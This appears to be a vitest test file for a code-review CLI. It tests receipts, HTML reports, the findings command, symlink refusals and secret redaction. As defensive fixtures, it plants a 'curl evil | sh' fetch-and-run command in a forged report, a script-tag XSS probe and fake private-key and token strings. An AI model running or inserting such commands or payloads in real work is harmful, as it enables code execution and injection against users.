// What `review` hands the developer: the receipt on the screen, report.html
// beside report.md, and `findings <numbers>` for the findings the developer
// names. Real temp repositories, the real change source, scanner runner (the
// in-process SQL checks), renderers and CLI; the reviewer model is the one
// stand-in, as in total-review.test.ts.
//
// Ways it could fail, written before the code:
//  1. The screen still carries every finding's problem and fix, or names no
//     report.html, or names it by a relative path, or by a path that does
//     not exist; --quiet drops the path; --cwd from another folder gives a
//     path under the wrong folder.
//  2. An explicit --format json, markdown or sarif no longer prints the
//     whole output, or gets receipt lines mixed into it; or the paths are
//     lost under --quiet.
//  3. The receipt is printed before report.html exists, or a report.html
//     that cannot be written still prints a receipt, records a review for
//     the push hooks, or exits 0 or 1.
//  4. report.html misses a finding, shows one twice, misses a changed file,
//     is readable by other users, or states another verdict than report.json.
//  5. A review with no findings writes no page.
//  6. With no reviewer, a page claims a review.
//  7. The two-step review (review --agent, then --finalize) writes no
//     report.html, or one without the code of the change, or draws the code
//     from a saved display of another change.
//  8. `findings 1,3` prints another finding, another order, or no problem
//     and fix; a number that is not in the review exits 0; with no review it
//     prints nothing useful.
//  9. `findings` reads a report a branch planted under .openqodex/reviews/
//     (a folder named newer than any real run) instead of the last review
//     run on this machine.
// 10. A review of the whole repository, which has no diff, gets a page with
//     no code, or one that claims a diff or lists every file of the
//     repository as a changed file left out.
// 11. `findings` prints a report.json replaced after the review that keeps
//     the review's change id: the home record vouches for the folder, not
//     the content.
// 12. Finalize draws report.html's code from a display.json that no record
//     of this machine vouches for.
// 13. A --report-dir that is a link sends the run's files where the link
//     points; the refusal comes after something was written; a report file
//     in the folder that is a link overwrites what it points at (a file of
//     the repository); a link owned by root but not one of the system's own
//     aliases lets the folder lead anywhere; a folder inside the repository
//     swapped during the run for a link to its own renamed copy (the same
//     folder by identity) is written through, though the repository holds
//     that link.
// 15. A home record is read through a record folder that is a link into
//     the repository, so the repository supplies the record.
// 16. Finalize redacts with the fingerprints of a scan.json the run record
//     does not vouch for, shows its code or records it for `findings`; or a
//     run of some kind keeps no record to vouch with.
// 17. A secret in a symbol id or in a reviewer's own `id` or `token` field
//     escapes the redaction, which spared every field of those names.
// 14. A string of a finished review reaches report.html, report.md,
//     report.json or the receipt without the redaction: a line of a private
//     key quoted in the summary, a secret in a suggested change, a dropped
//     reason or a file name, or a secret in the repository's absolute path.
import { existsSync, mkdirSync, readdirSync, readFileSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { isAbsolute, join } from "node:path";
import { spawnSync } from "node:child_process";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { redactSecrets, renderReceipt } from "@openqodex/core";
import type { Report } from "@openqodex/core";
import { parseFlags } from "../src/flags.js";
import { DEPTH_ENV, redactStored } from "@openqodex/review";
import type { ReviewerDriver, ReviewerSession, Turn } from "@openqodex/review";
import { runReview } from "../src/review-run.js";
import { reportFolderWriter, reviewOutputs, systemAlias } from "../src/pipeline.js";
import { readHomeLastReview, readHomeReceipt, readHomeRun } from "../src/receipts.js";
import { run as findings } from "../src/commands/findings.js";
import { cli, sandbox } from "./init-helpers.js";
import { removeTempDirs, tempDir } from "../../../tests/temp-dirs.mjs";

afterAll(removeTempDirs);

(globalThis as Record<string, unknown>).__OPENQODEX_VERSION__ = "0.0.0-test";

// Two flagged lines: the in-process SQL check raises c1 on line 1.
const SQL = "CREATE OR REPLACE FUNCTION public.admin_get_hygiene()\nRETURNS jsonb LANGUAGE sql STABLE AS $$ SELECT 1 $$;\n";

function git(cwd: string, ...args: string[]): string {
  const r = spawnSync("git", ["-c", "user.name=T", "-c", "user.email=t@openqodex.invalid", "-c", "commit.gpgsign=false", ...args], { cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout;
}

function repo(): string {
  const dir = realpathSync(tempDir("oq-receipt-"));
  git(dir, "init", "-q", "-b", "main");
  writeFileSync(join(dir, "README.md"), "hello\n");
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", "Base");
  mkdirSync(join(dir, "db"));
  writeFileSync(join(dir, "db/x.sql"), SQL);
  writeFileSync(join(dir, "README.md"), "hello\nmore\n");
  return dir;
}

type Answer = (text: string) => Partial<Turn>;

// The model provider stand-in: each send answers with the next recorded turn.
function fake(answers: Answer[], available = true): ReviewerDriver {
  let sent: string[] = [];
  return {
    name: "claude",
    traced: true,
    async detect() {
      return available ? { ok: true as const, version: "9.9.9", bin: "/fake/claude" } : { ok: false as const, missing: "claude is not installed", fix: "install Claude Code" };
    },
    start(): ReviewerSession {
      sent = [];
      return {
        pid: 4242,
        async send(text: string): Promise<Turn> {
          sent.push(text);
          const next = answers[sent.length - 1] ?? answers[answers.length - 1]!;
          return { finalText: "", calls: [], usage: { turns: 1, input_tokens: 10, output_tokens: 5, cost_usd: 0.01 }, sessionId: "fake", failure: null, ...next(sent[0] ?? text) };
        },
        async close() {},
      };
    },
  };
}

const changeIdOf = (brief: string) => /`change_id`: `([0-9a-f]{12})`/.exec(brief)?.[1] ?? "missing";

const finding = (over: Record<string, unknown>) => ({
  severity: "major",
  category: "security",
  confidence: 0.9,
  file_path: "db/x.sql",
  line_number: 1,
  title: "Admin function callable by anyone",
  problem: "The new admin function keeps the default execute grant for every role.",
  consequence: "Any signed in user can call an admin function.",
  fix: "Revoke execute from public and grant it to the service role only.",
  source: null,
  ...over,
});

// Three findings: the scanner candidate raised (major), a minor one and a critical one.
const three: Answer = (brief) => ({
  finalText: JSON.stringify({
    version: 2,
    change_id: changeIdOf(brief),
    summary: "Adds an admin SQL function and a README line.",
    findings: [
      finding({ source: "sqllint:function-default-public-execute", candidate: "c1" }),
      finding({ severity: "minor", category: "maintainability", line_number: 2, title: "Function body is a placeholder", problem: "The body selects a constant.", consequence: "Callers get nothing useful.", fix: "Write the real query." }),
      finding({ severity: "critical", category: "bug", file_path: "README.md", line_number: 2, title: "README line <script>alert(1)</script>", problem: "The line says more.", consequence: "Readers learn nothing.", fix: "Say what the module does." }),
    ],
    dropped: [],
  }),
});
const none: Answer = (brief) => ({ finalText: JSON.stringify({ version: 2, change_id: changeIdOf(brief), summary: "Adds an admin SQL function.", findings: [], dropped: [{ candidate: "c1", reason: "the function is internal", file_path: "db/x.sql", line_number: 1 }] }) });

let out: string;
let err: string;
let home: string;
// Whether report.html existed at the moment a receipt line reached stdout.
let htmlAtReceipt: boolean | null;
beforeEach(() => {
  out = "";
  err = "";
  htmlAtReceipt = null;
  home = tempDir("oq-receipt-home-");
  vi.stubEnv("OPENQODEX_HOME", home);
  vi.stubEnv(DEPTH_ENV, "");
  vi.spyOn(process.stdout, "write").mockImplementation((s) => {
    const text = String(s);
    const path = /^Report: (.+)$/m.exec(text)?.[1];
    if (path !== undefined && htmlAtReceipt === null) htmlAtReceipt = existsSync(path);
    out += text;
    return true;
  });
  vi.spyOn(process.stderr, "write").mockImplementation((s) => ((err += String(s)), true));
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllEnvs();
});

function review(dir: string, driver: ReviewerDriver, extra: string[] = [], reportDir?: string): Promise<number> {
  const { global } = parseFlags(["--cwd", dir, "--no-color", ...extra], {});
  return runReview({ flags: global, scope: {}, noGraph: true, only: "sqllint", reviewer: "auto", timeoutMs: 60_000, drivers: [driver], reportDir });
}

const pathOf = (label: string, text: string): string => /^(?:Report|Markdown): (.+)$/m.exec(text.split("\n").filter((l) => l.startsWith(`${label}: `)).join("\n"))?.[1] ?? "";

describe("the receipt", () => {
  it("1. prints the verdict, one line per finding, the summary and the absolute paths of report.html and report.md, and no finding's prose, with --quiet and from another folder", async () => {
    const dir = repo();
    expect(process.cwd()).not.toBe(dir);
    expect(await review(dir, fake([three]), ["--quiet"])).toBe(0);
    const lines = out.trimEnd().split("\n");
    expect(lines[0]).toBe("Passed with warnings: 3 findings (1 critical, 1 major, 1 minor)");
    expect(lines).toContain("Summary: Adds an admin SQL function and a README line.");
    expect(lines).toContain("1. Critical bug: README line <script>alert(1)</script> (README.md:2)");
    expect(lines).toContain("2. Major security: Admin function callable by anyone (db/x.sql:1)");
    expect(lines).toContain("3. Minor maintainability: Function body is a placeholder (db/x.sql:2)");
    for (const prose of ["Problem:", "Fix:", "Why it matters:", "default execute grant", "Revoke execute"]) expect(out).not.toContain(prose);
    const html = pathOf("Report", out);
    const md = pathOf("Markdown", out);
    expect(isAbsolute(html)).toBe(true);
    expect(html.startsWith(join(dir, ".openqodex/reviews/"))).toBe(true);
    expect(html.endsWith("/report.html")).toBe(true);
    expect(md).toBe(html.replace(/report\.html$/, "report.md"));
    expect(existsSync(html) && existsSync(md)).toBe(true);
    expect(lines.slice(-2)).toEqual([`Report: ${html}`, `Markdown: ${md}`]);
    // Progress is gone with --quiet; the paths are results, on stdout.
    expect(err).not.toMatch(/Reviewer|Report:|Markdown:/);
  });

  it("2. an explicit format prints the whole output alone on stdout, and the two paths on stderr even with --quiet", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]), ["--format", "json", "--quiet"])).toBe(0);
    const report = JSON.parse(out) as Report;
    expect(report.findings).toHaveLength(3);
    const html = pathOf("Report", err);
    expect(html.startsWith(join(dir, ".openqodex/reviews/"))).toBe(true);
    expect(existsSync(html)).toBe(true);
    expect(pathOf("Markdown", err)).toBe(html.replace(/report\.html$/, "report.md"));
    out = "";
    expect(await review(dir, fake([three]), ["--format", "markdown"])).toBe(0);
    expect(out).toContain("**Why it matters:**");
    expect(out).not.toMatch(/^Report: /m);
  });

  it("3. writes report.html before the receipt; when report.html cannot be written, prints no receipt, records no review and exits 2", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    expect(htmlAtReceipt).toBe(true);

    out = "";
    err = "";
    const folder = join(tempDir("oq-receipt-dir-"), "review");
    mkdirSync(join(folder, "report.html"), { recursive: true });
    const fresh = repo();
    expect(await review(fresh, fake([three]), [], folder)).toBe(2);
    expect(out).toBe("");
    expect(err).toContain("could not write report.html");
    expect(readHomeReceipt(home, fresh, "latest")).toBeNull();
  });
});

describe("report.html", () => {
  it("4. holds every finding once under its line, every changed file and the verdict of report.json, readable by its owner only", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    const path = pathOf("Report", out);
    const html = readFileSync(path, "utf8");
    const report = JSON.parse(readFileSync(path.replace(/report\.html$/, "report.json"), "utf8")) as Report;
    expect(statSync(path).mode & 0o777).toBe(0o600);
    for (const n of [1, 2, 3]) expect(html.split(`id="f${n}"`).length - 1).toBe(1);
    expect(html.split('id="f4"').length - 1).toBe(0);
    expect(html).toContain("db/x.sql");
    expect(html).toContain("README.md");
    expect(html).toContain("CREATE OR REPLACE FUNCTION public.admin_get_hygiene()");
    expect(report.verdict).toBe("passed");
    expect(html).toContain("Passed with warnings: 3 findings (1 critical, 1 major, 1 minor)");
    expect(html).not.toMatch(/<script/i);
    expect(html).toContain("README line &lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("5. is written for a review with no findings", async () => {
    const dir = repo();
    expect(await review(dir, fake([none]))).toBe(0);
    expect(out.split("\n")[0]).toBe("Passed: no findings");
    const html = readFileSync(pathOf("Report", out), "utf8");
    expect(html).toContain("No findings on the changed lines.");
    expect(html).toContain("db/x.sql");
  });

  it("10. for a review of the whole repository, shows the lines around each cited line from the snapshot, and no diff", async () => {
    const dir = repo();
    const answer: Answer = (brief) => ({
      finalText: JSON.stringify({ version: 2, change_id: changeIdOf(brief), summary: "The repository holds one SQL function.", findings: [finding({ source: "sqllint:function-default-public-execute", candidate: "c1" })], dropped: [] }),
    });
    const { global } = parseFlags(["--cwd", dir, "--no-color"], {});
    expect(await runReview({ flags: global, scope: {}, all: true, noGraph: true, only: "sqllint", reviewer: "auto", timeoutMs: 60_000, drivers: [fake([answer])] }), err).toBe(0);
    const html = readFileSync(pathOf("Report", out), "utf8");
    expect(html.split('id="f1"').length - 1).toBe(1);
    expect(html).toContain("lines 1 to 2");
    expect(html).toContain("CREATE OR REPLACE FUNCTION public.admin_get_hygiene()");
    expect(html).not.toContain("@@ -");
    expect(html).not.toContain("Diffs for");
  });

  it("6. with no reviewer, the page says the review is unavailable and nothing claims a review", async () => {
    const folder = join(tempDir("oq-receipt-dir-"), "review");
    expect(await review(repo(), fake([three], false), [], folder)).toBe(2);
    expect(out).toBe("");
    expect(readdirSync(folder).sort()).toEqual(["report.html", "reviewer.json", "unchecked-candidates.json"]);
    const html = readFileSync(join(folder, "report.html"), "utf8");
    expect(html).toContain("Full review unavailable");
    expect(html).toContain("claude is not installed");
    expect(html).not.toContain("Passed");
    expect(err).toContain(`Status page: ${join(folder, "report.html")}`);
  });
});

describe("7. the two-step review", () => {
  it("writes report.html with the code of the change, and refuses a saved display of another change", () => {
    const s = sandbox({ "README.md": "hello\n" });
    writeFileSync(join(s.repo, "notes.txt"), "first line of the notes\n");
    const brief = cli(s, ["review", "--agent", "--no-install"]);
    expect(brief.status, brief.stderr).toBe(0);
    const latest = JSON.parse(readFileSync(join(s.repo, ".openqodex/latest.json"), "utf8")) as { dir: string; change_id: string };
    const dir = join(s.repo, latest.dir);
    expect(statSync(join(dir, "display.json")).mode & 0o777).toBe(0o600);
    const submission = {
      version: 1,
      change_id: latest.change_id,
      summary: "Adds a notes file.",
      reviewer: "same-agent",
      findings: [{ severity: "minor", category: "maintainability", confidence: 0.9, file_path: "notes.txt", line_number: 1, title: "Notes have no heading", description: "The notes file starts with no heading.", suggested_change: null, source: null }],
    };
    writeFileSync(join(dir, "agent-findings.json"), JSON.stringify(submission));
    const done = cli(s, ["review", "--finalize", "--no-color"]);
    expect(done.status, done.stderr).toBe(0);
    const html = pathOf("Report", done.stdout);
    expect(html).toBe(join(realpathSync(dir), "report.html"));
    expect(done.stdout).toContain("1. Minor maintainability: Notes have no heading (notes.txt:1)");
    const page = readFileSync(html, "utf8");
    expect(page).toContain("first line of the notes");
    expect(page.split('id="f1"').length - 1).toBe(1);

    const saved = JSON.parse(readFileSync(join(dir, "display.json"), "utf8")) as { change_id: string };
    writeFileSync(join(dir, "display.json"), JSON.stringify({ ...saved, change_id: "f".repeat(64) }));
    const again = cli(s, ["review", "--finalize", "--no-color"]);
    expect(again.status, again.stderr).toBe(0);
    expect(again.stderr).toContain("report.html shows the findings without the code");
    const without = readFileSync(html, "utf8");
    expect(without).not.toContain("first line of the notes");
    expect(without).toContain("Notes have no heading");
  });
});

describe("findings <numbers>", () => {
  it("8. prints exactly the named findings in the receipt's order, with problem, why, fix and source", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    out = "";
    expect(await findings(["1,3", "--cwd", dir])).toBe(0);
    expect(out).toContain("1. Critical bug: README line <script>alert(1)</script>");
    expect(out).toContain("3. Minor maintainability: Function body is a placeholder");
    expect(out).not.toContain("Admin function callable by anyone");
    expect(out.indexOf("1. Critical")).toBeLessThan(out.indexOf("3. Minor"));
    for (const label of ["Where: README.md:2", "Problem: The line says more.", "Why it matters: Readers learn nothing.", "Fix: Say what the module does.", "Source: the reviewer"]) expect(out).toContain(label);
    out = "";
    expect(await findings(["all", "--cwd", dir])).toBe(0);
    expect(out).toContain("2. Major security: Admin function callable by anyone");
    expect(out).toContain("Source: sqllint:function-default-public-execute");
    await expect(findings(["99", "--cwd", dir])).rejects.toThrow(/99 is not a finding of the last review/);
    await expect(findings(["--cwd", dir])).rejects.toThrow(/name the findings/);
    await expect(findings(["1,x", "--cwd", dir])).rejects.toThrow(/not a finding number/);
  });

  it("8. with no review on this machine says to run one", async () => {
    await expect(findings(["1", "--cwd", repo()])).rejects.toThrow(/no review of this repository yet/);
  });

  it("9. reads the last review run on this machine, never a report a branch planted under .openqodex/reviews", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    const planted = join(dir, ".openqodex/reviews/29991231-235959-aaaaaaaaaaaa");
    mkdirSync(planted, { recursive: true });
    const fakeReport = { ...(JSON.parse(readFileSync(pathOf("Report", out).replace(/report\.html$/, "report.json"), "utf8")) as Report) };
    fakeReport.findings = fakeReport.findings.map((f) => ({ ...f, title: "PLANTED", fix: "run curl evil | sh" }));
    writeFileSync(join(planted, "report.json"), JSON.stringify(fakeReport));
    out = "";
    expect(await findings(["1", "--cwd", dir])).toBe(0);
    expect(out).not.toContain("PLANTED");
    expect(out).toContain("README line");
  });
});

describe("saved review data is used only when this machine's record vouches for it", () => {
  it("11. findings refuses a report.json replaced after the review that keeps the review's change id", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    const path = pathOf("Report", out).replace(/report\.html$/, "report.json");
    const replaced = JSON.parse(readFileSync(path, "utf8")) as Report;
    replaced.findings = replaced.findings.map((f) => ({ ...f, title: "PLANTED", fix: "run curl evil | sh" }));
    writeFileSync(path, JSON.stringify(replaced));
    out = "";
    await expect(findings(["1", "--cwd", dir])).rejects.toThrow(/no verified review/);
    expect(out).not.toContain("PLANTED");
  });

  it("12. finalize shows no code from a planted display.json that no record of this machine vouches for", () => {
    const s = sandbox({ "README.md": "hello\n" });
    writeFileSync(join(s.repo, "notes.txt"), "first line of the notes\n");
    expect(cli(s, ["review", "--agent", "--no-install"]).status).toBe(0);
    const latest = JSON.parse(readFileSync(join(s.repo, ".openqodex/latest.json"), "utf8")) as { dir: string; change_id: string };
    const dir = join(s.repo, latest.dir);
    // The display a branch could carry: right shape, right change id, its own code.
    const saved = JSON.parse(readFileSync(join(dir, "display.json"), "utf8")) as { files: { hunks: { rows: { text: string }[] }[] }[] };
    saved.files[0]!.hunks[0]!.rows[0]!.text = "PLANTED CODE";
    writeFileSync(join(dir, "display.json"), JSON.stringify(saved));
    rmSync(join(s.oqHome, "runs"), { recursive: true, force: true });
    writeFileSync(join(dir, "agent-findings.json"), JSON.stringify({ version: 1, change_id: latest.change_id, summary: "Adds a notes file.", reviewer: "same-agent", findings: [] }));
    const done = cli(s, ["review", "--finalize", "--no-color"]);
    expect(done.status, done.stderr).toBe(0);
    const page = readFileSync(join(dir, "report.html"), "utf8");
    expect(page).not.toContain("PLANTED CODE");
    expect(page).not.toContain("first line of the notes");
    expect(done.stderr).toContain("report.html shows the findings without the code");
  });
});

describe("13. a report folder reached through a link", () => {
  it("is refused with exit 2 before anything is written, for review and scan, and nothing lands where the link points", () => {
    const s = sandbox({ "README.md": "hello\n" });
    writeFileSync(join(s.repo, "notes.txt"), "one line\n");
    const target = tempDir("oq-link-target-");
    const link = join(tempDir("oq-link-"), "out");
    symlinkSync(target, link);
    for (const command of [["review", "--report-dir", link], ["scan", "--no-install", "--report-dir", link], ["review", "--report-dir", join(link, "review")]]) {
      const r = cli(s, command);
      expect(r.status, r.stderr).toBe(2);
      expect(r.stderr).toMatch(/symbolic link/);
      expect(readdirSync(target)).toEqual([]);
    }
  });

  it("13. a report file in the folder that is a link into the repository is refused with exit 2, and the file it points at is unchanged", () => {
    const s = sandbox({ "README.md": "hello\n", "package.json": "{\"name\":\"mine\"}\n" });
    writeFileSync(join(s.repo, "notes.txt"), "one line\n");
    const folder = join(tempDir("oq-out-"), "out");
    mkdirSync(folder);
    symlinkSync(join(s.repo, "package.json"), join(folder, "report.json"));
    for (const command of [["review", "--report-dir", folder], ["scan", "--no-install", "--report-dir", folder]]) {
      const r = cli(s, command);
      expect(r.status, r.stderr).toBe(2);
      expect(r.stderr).toMatch(/symbolic link/);
      expect(readFileSync(join(s.repo, "package.json"), "utf8")).toBe("{\"name\":\"mine\"}\n");
    }
  });

  it("13. only the system's own aliases pass: /var, /tmp and /etc pointing at /private on macOS, and nothing else, whoever owns it", () => {
    expect(systemAlias("/var", "private/var", "darwin")).toBe(true);
    expect(systemAlias("/tmp", "private/tmp", "darwin")).toBe(true);
    expect(systemAlias("/etc", "private/etc", "darwin")).toBe(true);
    expect(systemAlias("/var", "/home/user/current", "darwin")).toBe(false);
    expect(systemAlias("/opt/reports", "/home/user/current", "darwin")).toBe(false);
    expect(systemAlias("/var", "private/var", "linux")).toBe(false);
    expect(systemAlias("/private/var", "private/var", "darwin")).toBe(false);
  });

  it("13. a report folder in the repository swapped during the run for a link to its own renamed copy is refused at the next write, and nothing is written through the link", () => {
    const s = sandbox({ "README.md": "hello\n" });
    const reviews = join(s.repo, ".openqodex", "reviews");
    const folder = join(reviews, "old");
    mkdirSync(folder, { recursive: true });
    const write = reportFolderWriter(folder, s.repo);
    write({ "report.md": "first\n" });
    // The same folder by identity, now reached through a link the repository holds.
    renameSync(folder, join(reviews, "moved"));
    symlinkSync("moved", folder);
    expect(() => write({ "report.json": "{}\n" })).toThrow(/link/);
    expect(readdirSync(join(reviews, "moved"))).toEqual(["report.md"]);
  });
});

describe("14. one redaction pass for every output of a review", () => {
  it("leaves no secret in report.html, report.md, report.json, report.sarif or the receipt: a key line in the summary, a suggested change, a dropped reason, a file name, the repository's path", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]), ["--format", "json"])).toBe(0);
    const base = JSON.parse(out) as Report;
    const PEM = ["-----BEGIN RSA PRIVATE KEY-----", "MIIEowIBAAKCAQEAq7BFUpkGp3LQmlQBmpP2Wvs7Y0dQ9XDu1cJx0j4Q2PbTnZ5", "x4yWm9lHk1oNn2E8sR7dQwUy3aXhY5tTq6Ff0yG7bLc9dK1mN2pQ3rS4tU5vW6xY", "-----END RSA PRIVATE KEY-----"].join("\n");
    const BODY = PEM.split("\n")[1]!;
    const TOKEN = ["ghp", "Zq81mXv0LkP2wRt5YbN7cD4eF6gH9jK3sA1u"].join("_");
    const report: Report = {
      ...base,
      summary: `Commits a key whose first line is ${BODY}.`,
      findings: base.findings.map((f, i) => (i === 0 ? { ...f, file_path: `keys/${TOKEN}.txt`, suggested_change: `token = "${TOKEN}"` } : f)),
      dropped: [{ candidate: { id: "c9", token: "gitleaks:generic-api-key", source: "gitleaks", ruleId: "generic-api-key", filePath: "conf.py", lineStart: 1, lineEnd: 1, severity: "high", reviewSeverity: "major", message: `Found ${TOKEN}`, reference: null }, reason: `the key ${TOKEN} is a sample` }],
    };
    const runDir = join(dir, `.openqodex/reviews/${TOKEN}`);
    const o = reviewOutputs({ report, display: null, dir: runDir, redact: (text) => redactSecrets(text, [PEM, TOKEN]), version: "0.0.0-test" });
    const receipt = renderReceipt(o.report, { ...o.paths, color: false });
    expect(Object.keys(o.files).sort()).toEqual(["report.html", "report.json", "report.md", "report.sarif"]);
    for (const text of [...Object.values(o.files), receipt]) {
      expect(text).not.toContain(BODY.slice(0, 20));
      expect(text).not.toContain(TOKEN);
    }
    expect(receipt).toMatch(/^Report: .*\[redacted\].*report\.html$/m);
  });

  it("17. redacts a secret in a symbol id or in a reviewer's own token field, and keeps unredacted only the scanner citations at their own paths", () => {
    const SECRET = ["sk", "live", "Qw3rTy7890uIoPaSdF1234zx"].join("_");
    const impact = { symbols: [{ id: `app/${SECRET}.py#f@1:1`, file: `app/${SECRET}.py` }], touched: [`app/${SECRET}.py#f@1:1`] };
    expect(JSON.stringify(redactStored(impact, [SECRET]))).not.toContain(SECRET);
    const submission = { findings: [{ title: "x", token: SECRET, id: SECRET }], dropped: [{ candidate: SECRET, reason: "r" }] };
    expect(JSON.stringify(redactStored(submission, [SECRET]))).not.toContain(SECRET);
    // The citations finalize matches on stay as the scan wrote them.
    const scan = { candidates: [{ id: "c1", token: `gitleaks:${SECRET}`, message: SECRET }] };
    const kept = redactStored(scan, [SECRET]);
    expect(kept.candidates[0]).toEqual({ id: "c1", token: `gitleaks:${SECRET}`, message: "[redacted]" });
    const report = { dropped: [{ candidate: { id: "c1", token: `gitleaks:${SECRET}` }, reason: SECRET }], not_reviewed: [{ id: "c2", token: `x:${SECRET}` }], findings: [{ id: SECRET }] };
    const r = redactStored(report, [SECRET]);
    expect(r.dropped[0]).toEqual({ candidate: { id: "c1", token: `gitleaks:${SECRET}` }, reason: "[redacted]" });
    expect(r.not_reviewed[0]).toEqual({ id: "c2", token: `x:${SECRET}` });
    expect(r.findings[0]).toEqual({ id: "[redacted]" });
  });
});

describe("home records are read only from OpenQodex's own home", () => {
  it("15. a record folder that is a link into the repository is not read: findings, the push records and the run records see no record", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    // Replace each repository folder of the home records with a link to a
    // folder the repository holds, carrying the same files.
    for (const kind of ["last-review", "receipts"]) {
      const root = join(home, kind);
      const id = readdirSync(root)[0]!;
      const planted = join(dir, `planted-${kind}`);
      mkdirSync(planted);
      for (const f of readdirSync(join(root, id))) writeFileSync(join(planted, f), readFileSync(join(root, id, f)));
      rmSync(join(root, id), { recursive: true });
      symlinkSync(planted, join(root, id));
    }
    expect(readHomeLastReview(home, dir)).toBeNull();
    expect(readHomeReceipt(home, dir, "latest")).toBeNull();
    await expect(findings(["1", "--cwd", dir])).rejects.toThrow(/no review of this repository yet/);
  });
});

describe("16. finalize trusts a run's files only as this machine recorded them", () => {
  it("shows no code, records nothing for findings and says why when scan.json is not the one the run record holds", () => {
    const s = sandbox({ "README.md": "hello\n" });
    writeFileSync(join(s.repo, "notes.txt"), "first line of the notes\n");
    expect(cli(s, ["review", "--agent", "--no-install"]).status).toBe(0);
    const latest = JSON.parse(readFileSync(join(s.repo, ".openqodex/latest.json"), "utf8")) as { dir: string; change_id: string };
    const dir = join(s.repo, latest.dir);
    // Its fingerprints replaced (this change has no secret, so emptying them
    // would leave the text as it was), as a scan.json from elsewhere would be.
    const scan = JSON.parse(readFileSync(join(dir, "scan.json"), "utf8")) as { secretFingerprints: unknown[] };
    writeFileSync(join(dir, "scan.json"), `${JSON.stringify({ ...scan, secretFingerprints: [{ length: 32, sha256: "0".repeat(64) }] }, null, 2)}\n`);
    writeFileSync(join(dir, "agent-findings.json"), JSON.stringify({ version: 1, change_id: latest.change_id, summary: "Adds a notes file.", reviewer: "same-agent", findings: [] }));
    const done = cli(s, ["review", "--finalize", "--no-color"]);
    expect(done.status, done.stderr).toBe(0);
    expect(readFileSync(join(dir, "report.html"), "utf8")).not.toContain("first line of the notes");
    expect(done.stderr).toContain("report.html shows the findings without the code");
    expect(readHomeLastReview(s.oqHome, s.repo)).toBeNull();
  });

  it("records the run of every kind: a review of the whole repository gets a run record too", () => {
    const s = sandbox({ "README.md": "hello\n" });
    expect(cli(s, ["review", "--agent", "--all", "--no-install"]).status).toBe(0);
    const latest = JSON.parse(readFileSync(join(s.repo, ".openqodex/latest-all.json"), "utf8")) as { dir: string };
    const run = readHomeRun(s.oqHome, s.repo, latest.dir.split("/").pop()!);
    expect(run?.scan_sha256).toMatch(/^[0-9a-f]{64}$/);
  });
});
